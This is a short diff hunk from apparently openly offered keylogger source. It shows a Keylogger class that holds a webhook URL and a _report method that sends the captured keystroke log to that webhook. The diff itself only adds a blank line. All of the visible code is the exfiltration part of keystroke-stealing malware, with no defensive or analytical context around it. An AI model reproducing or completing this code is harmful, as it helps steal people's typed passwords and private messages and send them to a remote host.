@@ -12,6 +12,7 @@ class Keylogger:
         self.interval = interval
         self.webhook = Webhook(webhook_url)
         self.log = ""
+
     def _report(self):
         if self.log != '':
             self.webhook.send(self.log)
